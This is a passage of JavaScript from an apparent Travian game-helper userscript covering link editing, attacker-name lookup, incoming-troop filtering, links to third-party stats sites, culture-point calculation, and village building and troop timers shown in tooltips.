		if( ! confirm(gtext("linkdel")+': '+unesc(RB.ln3[num].split("\/@_")[1])+' ?') ) return;
		RB.ln3.splice(num, 1);
		saveLink3();
	}
	function editLink ( num ) {
		var oneLink = alinks[num].split("\/@_");
		var newName = prompt(gtext("linkname"), unesc(oneLink[1]));
		if( newName == null ) return;
		alinks[num] = oneLink[0] + "\/@_" + esc(newName);
		saveLink( alinks );
	}
	function editLink3 ( num ) {
		var oneLink = RB.ln3[num].split("\/@_");
		var newName = prompt(gtext("linkname"), unesc(oneLink[1]));
		if( newName == null ) return;
		RB.ln3[num] = oneLink[0] + "\/@_" + esc(newName);
		saveLink3();
	}
	function editCLink () {
		if( closeWindowN(6) ) return;

		function removeCLink ( num ) {
			eBody.removeChild($g('sn'+num));
		}
		function addCLink ( fl ) {
			var v = fl ? crtPath: '';
			var newA = trImg(allIDs[39],gtext("del"));
			newA.addEventListener('click', function(x) { return function() { removeCLink(x); }}(SN), false);
			eBody.appendChild($em('TR',[$c($e('INPUT',[['value',''],['name','lname'],['size',20]])), $c($e('INPUT',[['value',v],['name','lurl'],['size',50]])),$c(newA)],[['id','sn'+(SN++)]]));
		}
		function saveCLinks () {
			var names = $gn('lname');
			var urls = $gn('lurl');
			var newCL = '';
			for( var i = 0; i < names.length; i++ ) {
				if( urls[i].value.length < 3 ) continue;
				if( names[i].value.length == 0 ) {
					if( urls[i].value.length > 25 )
						newCL += esc(urls[i].value.slice(0,9) +'..'+ urls[i].value.slice(-14)) +"\/@_"+ esc(urls[i].value) +"@@_";
					else
						newCL += urls[i].value +"\/@_"+ esc(urls[i].value) +"@@_";
				} else newCL += esc(names[i].value) +"\/@_"+ esc(urls[i].value) +"@@_";
			}
			RB_setValue(GMcookieID + "ln2", newCL);
			cancelCLinks();
			redrawLinks();
		}
		function cancelCLinks () {
			closeWindowN(6);
		}

		var SN = 0;
		var eBody = $e('TBODY');
		var editLinks = $ee('TABLE',eBody);
		editLinks.appendChild($em('THEAD',[$ee('TR',okTD(saveCLinks,cancelCLinks,3)),$em('TR',[$c(gtext("linkname")),$c('URL',[['colspan',2]])])]));
		for( var i = 0; i < clinks.length; i++ ) {
			var oneLink = clinks[i].split("\/@_");
			var newA = trImg(allIDs[39],gtext("del"));
			newA.addEventListener('click', function(x) { return function() { removeCLink(x); }}(SN), false);
			eBody.appendChild($em('TR',[$c($e('INPUT',[['value',unesc(oneLink[0])],['name','lname'],['size',20]])), $c($e('INPUT',[['value',unesc(oneLink[1])],['name','lurl'],['size',50]])),$c(newA)],[['id','sn'+(SN++)]]));
		}
		var newA = $a('+',[['href',jsVoid],['title',"add new"],['style','color:red;']]);
		newA.addEventListener('click', function() { addCLink(false); }, true);
		var newB = $a('(+)',[['href',jsVoid],['title',"add current"],['style','color:red;']]);
		newB.addEventListener('click', function() { addCLink(true); }, true);
		editLinks.appendChild($ee('TFOOT',$em('TR',[$em('TD',[newA,' / ',newB],[['style','text-align:center;font-size:20px;']]),okTD(saveCLinks,cancelCLinks,2)])));

		windowID[6] = makeFloatD(editLinks, 9);
	}

	var flKarte = /karte.+?[?&]d=.+c=/i.test(crtPath) ? true: false;
	if( /karte.php|position_details.php/i.test(crtPath) && ver4FL ) flKarte = true;
	// village links
	var ln_cookie = RB_getValue(GMcookieID + "ln", "");
	var alinks = ln_cookie.split("@@_");
	alinks.splice((alinks.length - 1), 1);
	// free constant links
	var ln_cookie = RB_getValue(GMcookieID + "ln2", "");
	var clinks = ln_cookie.split("@@_");
	clinks.splice((clinks.length - 1), 1);
	// links bound to village
	loadVCookie('ln3', 'ln3', village_aid, 1);
	if( RB.ln3[0] == 0 ) RB.ln3.length = 0;

	var newTBody = $e('TBODY');
	if( RB.bodyH[2] == 1 ) $at(newTBody,[['style','display:none']]);

	rbLinks = $e('TABLE',[['id',allIDs[9]]]);
	var newTHead = $e('THEAD');
	var newTR = $e('TR');
	if( ! ver4FL && flKarte ) {
		var newA = $a('(+)',[['href',jsVoid],['title',gtext("addcur")],['style','color:red;']]);
		if( getVTip(getVid(crtPath)) == '' )
			newA.addEventListener('click', addLink, true);
		else
			$at(newA,[['style','color:'+vHColor+';']]);
		newTR.appendChild($c(newA));
	}
	var editCL = trImg(allIDs[38],gtext("edit"));
	editCL.addEventListener('click', editCLink, false);

	var hideP = imgHide(2);
	hideP.addEventListener('click', function (x) { return function() { bodyHide(x); }}([newTBody,2,hideP]), false);

	var newTD = $em('TD',[hideP,' ',gtext("links"),': ',editCL],[['colspan',(flKarte?(ver4FL?3:2):2)]]);
	if( flKarte ) {
		var sortL = $ee('A',$e('IMG',[['src',img_updown]]),[['href',jsVoid],['title',gtext("edit")],['style','padding:0px 5px;']]);
		sortL.addEventListener('click', sortLinks, false);
		newTD.appendChild(sortL);
	}
	newTR.appendChild(newTD);
	newTHead.appendChild(newTR);
	rbLinks.appendChild(newTHead);

	for( var i = 0; i < clinks.length; i++ ) {
		var newTR = $e('TR');
		if( ! slt ) {
			if( i > 0 ) {
				var newA = $ee('A',$e('IMG',[['src',img_up]]),[['href',jsVoid]]);
				newA.addEventListener('click', function(x) { return function() { moveLinkUpDown(x); }}([i,2,-1]), false);
				var newTD = $c(newA);
			} else var newTD = $c($e('IMG',[['src', 'img/x.gif'],['style','height:12px;width:12px;']]));

			if( i < clinks.length-1 ) {
				var newA = $ee('A',$e('IMG',[['src',img_down]]),[['href',jsVoid]]);
				newA.addEventListener('click', function(x) { return function() { moveLinkUpDown(x); }}([i,2,1]), false);
				newTD.appendChild(newA);
			} else newTD.appendChild($e('IMG',[['src', 'img/x.gif'],['style','height:12px;width:12px;']]));

			newTR.appendChild(newTD);
		}
		var oneLink = clinks[i].split("\/@_");
		newTR.appendChild($c($a(unesc(oneLink[0]),[['href',unesc(oneLink[1])]]),[['colspan',(flKarte?(slt?3:2):2)]]));
		newTBody.appendChild(newTR);
	}
	if( i > 0 ) newTBody.appendChild($ee('TR',$c(' ',[['style','height:2px;line-height:2px;background-color:silver;'],['colspan',(flKarte ? 3:2)]])));

	intShowLinks(true);
	intShowLinks(false);

	rbLinks.appendChild(newTBody);

	if( RB.Setup[12] == 1 ) {
		windowID[5] = allIDs[9]+'F';
		$g(pageElem[2]).appendChild($ee('P',rbLinks,[['id',windowID[5]]]));
	} else {
		windowID[5] = makeFloatD(rbLinks, 3);
	}
}
function addlinkT4() {
	var vilView = $g('tileDetails');
	if( vilView ) {
		var h1 = $gt('H1',vilView)[0];
		if( ! h1 ) h1 = $gt('H1',cont)[0];
		if( h1 ) {
			var spn = $gt('SPAN',h1);
			var xy = getVidFromCoords(spn[0].innerHTML);
			newLink = 'd='+xy;
			var newName = spn[1].innerHTML +' '+ printCoords(xy);
			newName = prompt(gtext("linkname"), newName);
			if( newName == null ) return;
			var newOneLink = newLink + "\/@_" + esc(newName);
			RB.ln3.push(newOneLink);
			saveLink3();
		}
	}
}

function detectNameAttaker() {
	var tmenu = ver4FL ? $gc('filterContainer',cont)[0] : $g('textmenu');
	if( ! (tmenu) ) return;

	var ttable = [];
	var thref = [];
	var nameCache = [];
	var linkCache = [];
	var anameCache = [];

	function nameAttaker( num ) {
		var tname = nameCache[thref[num]];
		var tlink = linkCache[thref[num]];
		var aname = anameCache[thref[num]];
		if( ! tname ){
			var resb = httpGet(thref[num]);
			var res = resb.match(/<td><a href=\"(spieler\.php.+?)\">(.+)<\/a/i);
			tlink = res[1];
			tname = res[2];
			nameCache[thref[num]] = tname;
			linkCache[thref[num]] = tlink;
			res = resb.match(/<td><a href=\"(allianz\.php.+?)\">(.*)<\/a/i);
			aname = res[2];
			anameCache[thref[num]] = aname;
		}
		var tTD = $xf('tbody[@class="units"]/tr/th', 'f', ttable[num]);
		if( $gc(allIDs[29],tTD).length > 0 ) return;
		tTD.insertBefore($a(tname,[['href',tlink],['title',aname],['class',allIDs[29]]]),tTD.firstChild);
	}
	function prepareGetAttakers() {
		var allIn = $xf('.//table[tbody/tr/td/div[@class="in"]]','l');
		var hrefCache = [];
		var curTO = 0;
		for( var i = 0; i < allIn.snapshotLength; i++ ) {
			ttable[i] = allIn.snapshotItem(i);
			thref[i] = $xf('thead/tr/td[@class="role"]/a', 'f', ttable[i]).getAttribute('href');
			hrefCache[thref[i]] = true;
			curTO += hrefCache[thref[i]] ? 1: getRandom(500,2000);
			setTimeout(function(x) { return function() { nameAttaker(x); }}(i), curTO);
		}
	}

	var nameLink = $a('???',[['href',jsVoid]]);
	nameLink.addEventListener('click', prepareGetAttakers, false);
	var newSP = ver4FL ? $ee('DIV',nameLink,[['style',"position:absolute;margin:5px -30px;"]]):
		$em('SPAN',[' | ',nameLink]);
	if( ver4FL ) tmenu.insertBefore(newSP,tmenu.firstChild); else tmenu.appendChild(newSP);

	if( ver4FL ) {
		var attFI = $ee('BUTTON',trImg('iReport iReport1'),[['class',"iconFilter"],['onClick',jsNone]]);
		attFI.addEventListener('click', filterIncomeTroops, false);
		tmenu.insertBefore(attFI,tmenu.firstChild.nextSibling);
	}
}

var filterITObj = new Object;
function filterIncomeTroops () {
	function parseNextPage () {
		if( ! nP ) {
			filterITObj.statD.innerHTML = '';
			addSpeedAndRTSend(filterITObj.actD);
			return;
		}
		filterITObj.statD.innerHTML = 'scanning: page'+curNum;
		curNum++;
		ajaxRequest(nP, 'GET', null, function(ajaxResp) {
			var ad = ajaxNDIV(ajaxResp);
			ad = $xf('.//div[@id="content"]','f',ad);
			if( ! ad ) return;
			nP = getNextReportPage(ad);
			var allIn = $xf('.//table[tbody/tr/td/div[@class="in"]]','l',ad);
			for( var i=0; i<allIn.snapshotLength; i++ ) {
				var town = $xf('.//td[@class="role"]/a','f',allIn.snapshotItem(i));
				if( getVid(town.getAttribute('href')) == village_aid ) continue;
				var adT = allIn.snapshotItem(i).cloneNode(true);
				filterITObj.actD.appendChild(adT);
			}
			ad = null;
			setTimeout(parseNextPage, getRandom(300,1000));
		}, dummy);
	}

	function closeDiv() {
		var newBTX = $ee('BUTTON',gtext("close")+' (X)',[['onClick',jsNone],['class',allIDs[15]],['style','direction:ltr']]);
		newBTX.addEventListener('click', function() {closeWindowN(11);}, true);
		return $ee('DIV',newBTX);
	}

	if( closeWindowN(11) ) return;
	if( typeof filterITObj.newD == 'undefined' ) {
		filterITObj.newD = $e('DIV',[['class',"gid16"],['id','build'],['style','background-color:white;width:551px;']]);
		filterITObj.statD = $e('DIV');
		filterITObj.actD = $e('DIV');
		$am(filterITObj.newD,[closeDiv(),filterITObj.statD,filterITObj.actD,closeDiv()]);
		var nP = 'build.php?gid=16&tt=1&filter=1';
		var curNum = 1;
		parseNextPage();
	}
	windowID[11] = makeFloatD(filterITObj.newD, 11);
}

/***************************** Activity Servers **********************************/

var serversAC = 6;
RB.serversAN = new Array(serversAC);
function userActivityServers ( num, id, user ) {
	var dsrv = RB.serversAN[num-1] !== undefined ? RB.serversAN[num-1]: srv;
	if ( num == 3 ) {
		return ['travianbox.com','http://'+dsrv+'.testing.travianbox.com/Stats/'+(user?'Player?p=':'Alliance?a=')+id,'http://###'+dsrv+'###.testing.travianbox.com/stats/Player?p=...'];
	} else if ( num == 4 ) {
		if( RB.serversAN[num-1] === undefined ) dsrv = crtLang + crtName.split('.')[0];
		return ['travianstats.de','http://travianstats.de/index.php?m='+(user?'player':'alliance')+'_info&'+(user?'u':'a')+'id='+id+'&w='+dsrv,'http://travianstats.de/index.php?m=player_info&w=###'+dsrv+'###uid=...'];
	} else if ( num == 5 ) {
		if( RB.serversAN[num-1] === undefined ) dsrv = crtName;
		return ['gettertools.com','http://www.gettertools.com/'+dsrv+'/'+(user?'Player':'Alliance')+'/'+id+'-','http://www.gettertools.com/###'+dsrv+'###/Player/...'];
	} else if ( num == 6 ) {
		if( RB.serversAN[num-1] === undefined ) dsrv = crtName;
		return ['travian-live.com','http://travian-live.com/info.html?s='+dsrv+'&t='+(user?'player':'alliance')+'&v='+id,'http://travian-live.com/info.html?s=###'+dsrv+'###&t=player&v=...'];
	} else if ( num == 1 ) { //old 7
		if( RB.serversAN[num-1] === undefined ) dsrv = crtName;
		return ['travmap.shishnet.org','http://travmap.shishnet.org/map.php?server='+dsrv+'&'+(user?'player':'alliance')+'=id:'+id+'&groupby='+(user?'town':'player')+'&casen=on&format=svg&azoom=off','http://travmap.shishnet.org/map.php?server=###'+dsrv+'###&player=....'];
	} else {
		return ['travian.ws','http://travian.ws/analyser.pl?s='+dsrv+'&'+(user?'u':'a')+'id='+id,'http://travian.ws/analyser.pl?s=###'+dsrv+'###&uid=...'];
	}
}

function ActivityInfo ( id, user, al ) {
	var newR = $ee('TR',$c($e('IMG',[['src',img_stat]]),[['style','width:55px;']]));
	var newD = $c('',[['style','text-align:'+docDir[0]+';']]);
	for( var i = 1; i <= serversAC; i++ ) {
		var alink = userActivityServers( i, id, user );
		newD.appendChild($a(alink[0],[['href',alink[1]],['target','_blank']]));
		newD.appendChild($e('BR'));
	}
	newR.appendChild(newD);
	newR.appendChild($c('',[['id',allIDs[0]],['style','width:40%;text-align:'+docDir[0]+';']]));
	newT = $ee('TABLE',newR,[['class',allIDs[21]]]);
	var newP = $ee('P',newT);
	if( ver4FL ) { var lastT = $gt('TABLE',cont); insertAfter(newP, lastT[lastT.length-1]); }
	else cont.appendChild(newP);
}
function userActivityInfo() {
	// Get user id
	var uID = crtPath.match(/uid=(\d+)/);
	ActivityInfo( uID?uID[1]:userID, true );
}
function allyActivityInfo() {
	// Get server id
	var aID = crtPath.match(/aid=(\d+)/);
	if( aID ) aID = aID[1];
	else if( RB.dictionary[13] > 0 ) aID =  RB.dictionary[13]; else return;
	ActivityInfo( aID, false );
}

function viewMessageIW() {
	function selectMessage (num) {
		var allRows = $xf('.//tr[td/@class="sel"]','l',cont);
		var tds = allRows.snapshotItem(num).cells;
		$gt('INPUT',tds[0])[0].setAttribute('checked',true);
		var aLinks = $xf('.//a[contains(@href, "berichte.php?id=") or contains(@href, "nachrichten.php?id=")]','f',tds[1]);
		var aLink = aLinks.getAttribute('href');

		var tV = /berichte/.test(aLink) ? 1: 0;
		viewMessageIWDisplay( aLink, tV , (num>12?offsetPosition(aLinks):false));
	}

	var allRows = $xf('.//tr[td/@class="sel"]','l',cont);
	for( var i = 0; i < allRows.snapshotLength; i++ ) {
		var td = allRows.snapshotItem(i).cells[1];
		var newImg = $e('IMG',[['src',img_view]]);
		newImg.addEventListener('click', function(x) { return function() { selectMessage(x); }}(i), false);
		if( ver4FL )
			$at(newImg,[['style','position:relative;float:'+docDir[0]+';'+(/berichte/.test(crtPath)?'':docDir[0]+':-6px;')]]);
		td.insertBefore(newImg, td.firstChild);
	}
}

function viewMessageIWClose() {
	closeWindowN(4);
}
function viewMessageIWDisplay( aLink, tV, xy ) {
	var messCr = ver4FL ? './/div[@class="paper"]' : './/form[@action="nachrichten.php"]';
	var viewPref = [
		[messCr,'messages','width:'+(ver4FL?'555px;height:620px':'440px')+';background-color:white;padding:5px;text-align:left;'],
		['.//*[@id="report_surround"]','reports','width:'+(ver4FL?'540px':'500px')+';background-color:white;padding:5px;']];

	ajaxRequest(aLink, 'GET', null, function(ajaxResp) {
		viewMessageIWClose();
		var ad = ajaxNDIV(ajaxResp);
		var aV = $xf(viewPref[tV][0], 'f', ad);
		ad = null;
		if (aV) {
			var newBTX = $ee('BUTTON',gtext("close")+' (X)',[['onClick',jsNone],['class',allIDs[15]],['style','direction:ltr']]); //margin:5px 5px 0px;
			newBTX.addEventListener('click', viewMessageIWClose, true);
			newBTX.disabled = false;
			var newD = $em('DIV',[$ee('DIV',aV,[['class',viewPref[tV][1]],['style',viewPref[tV][2]]]),newBTX],[['style','text-align:center;background-color:white;']]);
			windowID[4] = xy ? makeFloat(newD, xy[0], xy[1]): makeFloatD(newD, 4);
			if( ver4FL ) {
				var bigImg = $xf('.//img[contains(@class,"eportImage")]','f',aV);
				if( bigImg ) bigImg.parentNode.removeChild(bigImg);
			}
			if( tV == 1 ) { addSpeedAndRTSend(newD); analyzerBattle(); } else convertCoordsInMessagesToLinks();
			addRefIGM( windowID[4] );
			if( xy ) updatePosition( windowID[4], xy, 4 );
		}
	}, dummy);
}

function viewMessageIWK ( piBl ) {
	var iBl = piBl || cont;
	var allRows = $xf('.//td[.//a[contains(@href, "berichte.php?id=")]]','l',iBl);
	for( var i = 0; i < allRows.snapshotLength; i++ ) {
		var td = allRows.snapshotItem(i);
		var aLink = $xf('.//a[contains(@href, "berichte")]','f',td).getAttribute('href');
		var newImg = $e('IMG',[['src',img_view]]);
		if( ver4FL && /allianz/.test(crtPath) )
			$at(newImg,[['style','position:relative;float:'+docDir[0]+';'+docDir[0]+':-5px;']]);
		td.insertBefore(newImg, td.firstChild);
		newImg.addEventListener('click', function(x) { return function() { viewMessageIWDisplay(x[0],1,x[1]); }}([aLink,(i>12?offsetPosition(newImg):false)]), false);
	}
}

function culturePoints(){
	function villages2cp( noVil, classic ) {
		// formula from TB3, from fr3nchlover
		var rV = 0;
		if( classic )
			rV = Math.round(2 * Math.pow(noVil, 2)*10) * 100;
		else
			rV = Math.round(sC[0] * Math.pow(noVil, 2.3)) * sC[1];
		return rV;
	};

	//production CP in all villages
	var buildV = $g('build_value');
	if( ! buildV ) return;
	var prodCP = parseInt(buildV.rows[1].cells[1].innerHTML.match(/\d+/)[0]);
	if( buildV.rows.length == 3 ) prodCP += parseInt(buildV.rows[2].cells[1].innerHTML.match(/\d+/)[0]);

	var aX = $gt('P',cont);
	if (aX.length < 1) return;
	allCP = aX[aX.length-1].innerHTML.match(/\d+/g);
	if( ! allCP ) return;
	if( allCP.length < 2 ) return;
	//Current no of CP
	var curCP = parseInt(allCP[0]);
	//CP needed to create a new village
	var nextCP = parseInt(allCP[1]);

	var classic = false;
	if( villages2cp(villages_count, classic) != nextCP ) {
		classic = true;
		if( RB.dictFL[17] != 1 ) {
			RB.dictFL[17] = 1;
			saveCookie( 'DictFL', 'dictFL' );
		}
	}

	var newTABLE = $e('TABLE',[['class',allIDs[7]],['style','margin:2px 25px;']]);
	var newTR = $ee('TR',$c('#'));
	var cpTransl = $xf('.//a[contains(@href,"s=2")]','f',cont).innerHTML.onlyText().trim();

	if( RB.dictionary[19] != cpTransl ) {
		RB.dictionary[19] = cpTransl;
		saveCookie( 'Dict', 'dictionary' );
	}

	newTR.appendChild($c(RB.dictionary[19],[['colspan',2]]));
	newTR.appendChild($c(RB.dictionary[4]));
	newTABLE.appendChild(newTR);

	var nm = villages_count;
	for( var i = 0; i < 2; nm++ ) {
		var nmC = villages2cp(nm, classic);
		if( nmC > curCP ) i++;
		var newTR = $ee('TR',$c((nm+1)));
		newTR.appendChild($c(nmC));
		var tCP = nmC > curCP ? '('+ (curCP - nmC) +')': '+';
		newTR.appendChild($c(tCP));
		if( nmC > curCP ) {
			var j=timerB.length;
			timerB[j] = new Object();
			timerB[j].time = Math.round((nmC-curCP)/prodCP*86400);
			timerB[j].obj = $eT('TD', timerB[j].time, 1);
			timerB[j].ft = 1;
			newTR.appendChild(timerB[j].obj);
		} else newTR.appendChild($c('--:--'));
		newTABLE.appendChild(newTR);
	}
	cont.appendChild(newTABLE);
}

function parseDorf1 () {
	if( RB.Setup[14] == 0 ) return;

	function parseBuilds() {
		loadZVCookie('Dorf1','village_dorf1');
		var fl = false;
		var newCookie = [0];
		var t = 1;
		var s = ver42FL? 0: 1;
		var fl2 = false;
		var move = ver42FL? $gc('buildingList'): $g('building_contract');
		if( ver42FL ) {
			if( move.length < 1 ) fl2 = true;
		} else {
			if( ! move ) fl2 = true;
		}
		if( fl2 ) {
			if( RB.village_dorf1[0] != 0 ) fl = true;
		} else {
			var descr = ver42FL? $gt('li',move[0]): move.tBodies[0].rows;
			for( var i = 0; i < descr.length; i++ ) {
				newCookie[0]++;
				var td = ver42FL? $gt('div',descr[i]): descr[i].cells;
				newCookie[t++] = td[s].innerHTML.onlyText().replace(/\s+?/g,' ');
				if( ver4FL ) {
					if( td.length < 3 ) {
						newCookie[t++] = 0;
						newCookie[t++] = '';
					} else {
						var ts = td[s+1].innerHTML.match(/\d+:\d\d:\d\d/);
						newCookie[t++] = Math.round(RunTime[0]/1000) + toSeconds(ts?ts[0]:"0:00:00");
						newCookie[t++] = td[s+1].innerHTML.onlyText().replace(/.+?\d\d\s\S+\s/,'').replace(/\s+?/g,' ');
					}
				} else {
					if( td.length < 4 ) {
						newCookie[t++] = 0;
						newCookie[t++] = '';
					} else {
						var ts = td[2].innerHTML.match(/\d+:\d\d:\d\d/);
						newCookie[t++] = Math.round(RunTime[0]/1000) + toSeconds(ts?ts[0]:"0:00:00");
						newCookie[t++] = td[3].innerHTML.onlyText();
					}
				}
				if( RB.dictFL[14] == 0 ) {
					RB.dictionary[14] = newCookie[t-1].split(/\d/,1)[0];
					saveCookie( 'Dict', 'dictionary' );
					RB.dictFL[14] = 1;
					saveCookie( 'DictFL', 'dictFL' );
				}
			}
			fl = true;
		}
		if( fl ) saveVCookie('Dorf1',newCookie,1);
	}
	function parseAttack() {
		loadZVCookie('Dorf11','village_dorf11');
		var fl = RB.village_dorf11[0] == 0 ? false: true;
		var newCookie = [0];
		var t = 1;
		var move = $g('movements');
		if( ! move ) {
			saveVCookie('Dorf11',newCookie,1);
			return;
		}
		var descr = move.tBodies[0].rows;
		for( var i = 0; i < descr.length; i++ ) {
			var aimg = $gt('img',descr[i])[0];
			var atime = toSeconds(descr[i].innerHTML);
			if( aimg ) {
				newCookie[0]++;
				newCookie[t] = aimg.getAttribute('class');
				newCookie[t+2] = $gc('mov',descr[i])[0].innerHTML.onlyText().trim();
			}
			if( atime != 0 ) {
				newCookie[t+1] = Math.round(RunTime[0]/1000) + atime;
				t = t+3;
				fl = true;
			}
		}
		if( fl ) saveVCookie('Dorf11',newCookie,1);
	}
	function parseTroops() {
		loadZVCookie('Dorf12','village_dorf12');
		var newCookie = [0];
		var t = 1;
		var troops = $xf('.//tr[.//img]','r',$g("troops"));
		var fl = RB.village_dorf12[0] ==  troops.snapshotLength ? false : true;
		for( var i = 0; i < troops.snapshotLength; i++ ) {
			if( troops.snapshotItem(i).cells.length < 3 ) continue;
			newCookie[0]++;
			newCookie[t++] = troops.snapshotItem(i).getElementsByTagName('IMG')[0].getAttribute('class').match(/ u(.+)/)[1];
			newCookie[t++] = troops.snapshotItem(i).cells[1].innerHTML;
			if( ! fl ) {
				if( RB.village_dorf12[t-2] == undefined ) fl = true;
				if( RB.village_dorf12[t-2] != newCookie[t-2] ) fl = true;
				if( RB.village_dorf12[t-1] != newCookie[t-1] ) fl = true;
			}
		}
		if( fl ) saveVCookie('Dorf12',newCookie,1);
	}

	parseBuilds();
	if( /dorf1.php/.test(crtPath) ) {
		parseAttack();
		parseTroops();
	}
}

function showTooltipBuild ( tb ) {
	var newTABLE = $e('TABLE',[['class',allIDs[7]]]);
	for( var i = 0; i < tb[0]; i++ ) {
		var newTR = $ee('TR',$c(tb[i*3+1]));
		newTR.appendChild($c(tb[i*3+3]));
		newTABLE.appendChild(newTR);
	}
	makeTooltip(newTABLE);
}
function showTooltipDemolish ( tb ) {
	var newTABLE = $e('TABLE',[['class',allIDs[7]]]);
	for( var i = 0; i < tb[0]; i++ ) {
		var newTR = $ee('TR',$c(tb[i*3+1]));
		newTR.appendChild($c(tb[i*3+3]));
		newTABLE.appendChild(newTR);
	}
	makeTooltip(newTABLE);
}
function showTooltipInfo ( tb ) {
	var newTABLE = $e('TABLE',[['class',allIDs[7]]]);
	var rf = new Array();
	for( var i = 0; i < tb[0]; i++ ) rf[i]=i;
	rf.sort(function(a,b){return tb[a*4+2]-tb[b*4+2];});
	lastTimerB = timerB.length;
	var t = lastTimerB;
	for( var i = 0; i < tb[0]; i++ ) {
		var newTR = $ee('TR',$c(tb[rf[i]*4+3].replace(/"tinfo_c"/g,allIDs[47])));
		var htf = tb[rf[i]*4+2] - Math.round((new Date().getTime())/1000);
		if( htf > 0 ) {
			timerB[t] = new Object();
			timerB[t].time = htf;
			timerB[t].obj = $c(formatTime(htf, 0));
			newTR.appendChild(timerB[t++].obj);
		} else newTR.appendChild($c('--:--'));
		newTR.appendChild($c(tb[rf[i]*4+4]));
		newTABLE.appendChild(newTR);
	}
	makeTooltip(newTABLE);
}
function showTooltipAttack ( tb ) {
	var newTABLE = $e('TABLE',[['class',allIDs[7]]]);
	lastTimerB = timerB.length;
	var t = lastTimerB;
	for( var i = 0; i < tb[0]; i++ ) {
		var newTR = $ee('TR',$c($e('IMG',[['src','img/x.gif'],['class',tb[i*3+1]]])));
		var lrt = /2|adv/.test(tb[i*3+1]) ? '&laquo;': '&raquo;';
		newTR.appendChild($c(lrt));
		newTR.appendChild($c(tb[i*3+3]));
		var htf = tb[i*3+2] - Math.round((new Date().getTime())/1000);
		if( htf > 0 ) {
			timerB[t] = new Object();
			timerB[t].time = htf;
			timerB[t].obj = $c(formatTime(htf, 0));
			$am(newTR,[timerB[t++].obj,$c(formatTime(absTime(htf),4))]);
		} else $am(newTR,[$c('--:--'),$c('')]);
		newTABLE.appendChild(newTR);
	}
	makeTooltip(newTABLE);
}

function showDorf1 () {
	var vlist = $g('vlist');
	if( ! vlist ) return;
	var t = 0;
	villages = vlist.tBodies[0].rows;
	for( var i = 0; i < villages_id.length; i++ ) {
		loadZVCookie('Dorf1','village_dorf1',villages_id[i]);
		var newTD = $c('');
		if( RB.village_dorf1[0] > 0 ) {
			var dTime = RB.village_dorf1[2] - Math.round(RunTime[0]/1000);
			var color = dTime < 0 ? 'red': 'black';
			if( dTime < 0 ) dTime = 0;
			timerB3[t] = new Object();
			timerB3[t].time = dTime;
			timerB3[t].obj = $ee('SPAN',formatTime(dTime, 3),[['style','margin:0px 5px;color:'+color+';']]);
			var tb = RB.village_dorf1.slice();
			timerB3[t].obj.addEventListener("mouseover", function(x) { return function() { showTooltipBuild(x); }}(tb), false);
			timerB3[t].obj.addEventListener("mouseout", removeTooltip, false);
			newTD.appendChild(timerB3[t++].obj);
		} else newTD.appendChild($ee('SPAN','--:--',[['style','margin:0px 5px;']]));

		loadZVCookie('Dorf13','village_dorf13',villages_id[i]);
		if( RB.village_dorf13[0] > 0 ) {
			var dTime = RB.village_dorf13[2] - Math.round(RunTime[0]/1000);
			var color = dTime < 0 ? 'red': 'black';
			if( dTime < 0 ) dTime = 0;
			timerB3[t] = new Object();
			timerB3[t].time = dTime;
			timerB3[t].obj = $ee('SPAN',formatTime(dTime, 3));
			var tb = RB.village_dorf13.slice();
			timerB3[t].obj.addEventListener("mouseover", function(x) { return function() { showTooltipBuild(x); }}(tb), false);
			timerB3[t].obj.addEventListener("mouseout", removeTooltip, false);
			var newdid = linkVSwitch[i].match(/newdid=\d+/i)[0];
			newTD.appendChild($em('A',['[',timerB3[t++].obj,']'],[['href',fullName + 'build.php?'+newdid+'&gid=15'],['style','margin:0px 10px 0px -5px;color:'+color+';font-weight:normal;']]));
		}

		loadZVCookie('Dorf14','village_dorf14',villages_id[i]);
		if( RB.village_dorf14[0] > 0 ) {
			var now = Math.round(RunTime[0]/1000);
			var newCookie = [0];
			var fl = false;
			for( var j=0; j<RB.village_dorf14[0]; j++ ) {
				if( RB.village_dorf14[j*4+2] > now ) {
					newCookie[0]++;
					newCookie.push(RB.village_dorf14[j*4+1],RB.village_dorf14[j*4+2],RB.village_dorf14[j*4+3],RB.village_dorf14[j*4+4]);
				} else fl = true;
			}
			if( fl ) {
				var aid_t = village_aid;
				village_aid = villages_id[i];
				saveVCookie('Dorf14',newCookie,1);
				village_aid = aid_t;
			}
			if( newCookie[0] > 0 ) {
				var newI = trImg(allIDs[47]);
				newI.addEventListener("mouseover", function(x) { return function() { showTooltipInfo(x); }}(newCookie), false);
				newI.addEventListener("mouseout", removeTooltip, false);
				newTD.appendChild(newI);
			}
		}

		loadZVCookie('Dorf11','village_dorf11',villages_id[i]);
		if( RB.village_dorf11[0] > 0 ) {
			var newdid = linkVSwitch[i].match(/newdid=\d+/i)[0];
			var newAI = $a('',[['href',fullName + 'build.php?'+newdid+'&gid=16&id=39'],['style','font-weight:400;color:black;']]);
			var tb = RB.village_dorf11.slice();
			for( var j = 0; j < tb[0]; j++ ) {
				newAI.appendChild($e('IMG',[['src','img/x.gif'],['class',tb[j*3+1]]]));
				if(RB.Setup[14] > 1) {
					var htf = tb[j*3+2] - Math.round((new Date().getTime())/1000);
					if( htf > 0 ) {
						timerB3[t] = new Object();
						timerB3[t].time = htf;
						timerB3[t].obj = $ee('SPAN',formatTime(htf, 3));
						newAI.appendChild(timerB3[t++].obj);
					}
				}
			}
			newAI.addEventListener("mouseover", function(x) { return function() { showTooltipAttack(x); }}(tb), false);
			newAI.addEventListener("mouseout", removeTooltip, false);
			newTD.appendChild(newAI);
		}
		villages[i].appendChild(newTD);
	}
	var awake = $e('DIV',[['id',allIDs[28]]]);
	awake.addEventListener("click", editAWake, false);
	vlist.tHead.rows[0].appendChild($c(awake));
	aClockTimer = t;
	showAWake();
}

function editAWake () {
	var aClock = parseInt(RB_getValue(GMcookieID + 'AC','0'));
	var acc = aClock - Math.round((new Date().getTime())/1000) + getServerTime();
	var ac = acc < 0 ? formatTime(0,0) : formatTime(acc,0);
	var newClock = prompt(gtext("aclock"), ac);
	if( newClock == null ) return;
	var dg = newClock.match(/\d+/g);
	if( ! (dg) ) {
		aClock = 0;
	} else if( dg.length < 1 || dg.length > 3 ) {
		aClock = 0;
	} else {
		if( dg.length == 1 ) {
			aClock = Math.round((new Date().getTime())/1000)+parseInt(dg[0])*60;
		} else {
			var nA = dg.length == 3 ? [dg[0],dg[1],dg[2]]: [dg[0],dg[1],0];
			var tt = toSeconds(nA[0]+':'+nA[1]+':'+nA[2]);
			var st = getServerTime();
			aClock = tt > st ? tt-st: 86400+tt-st;
			aClock += Math.round((new Date().getTime())/1000);
		}
	}
